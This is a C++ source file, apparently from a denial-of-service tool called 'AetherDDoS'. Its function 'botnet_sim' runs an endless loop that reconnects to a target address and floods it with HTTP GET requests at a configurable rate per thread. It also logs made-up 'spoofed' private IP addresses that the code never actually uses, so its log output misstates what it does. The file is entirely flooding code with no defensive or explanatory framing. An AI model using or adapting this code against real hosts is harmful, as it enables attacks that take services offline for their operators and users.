#include "aether_ddos.h"
#include <random>

void AetherDDoS::botnet_sim(int thread_id) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> ip_dist(1, 254);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { log("[-] Botnet Socket failed: Thread " + std::to_string(thread_id)); return; }

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

    while (true) {
        std::string fake_ip = "192.168." + std::to_string(ip_dist(gen)) + "." + std::to_string(ip_dist(gen));
        log("[*] Botnet Thread " + std::to_string(thread_id) + ": Spoofed " + fake_ip);
        if (connect(sock, (sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
            std::string payload = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n";
            send(sock, payload.c_str(), payload.size(), 0);
        }
        std::this_thread::sleep_for(std::chrono::microseconds(1000000 / rate_per_thread));
        close(sock); sock = socket(AF_INET, SOCK_STREAM, 0);
    }
}
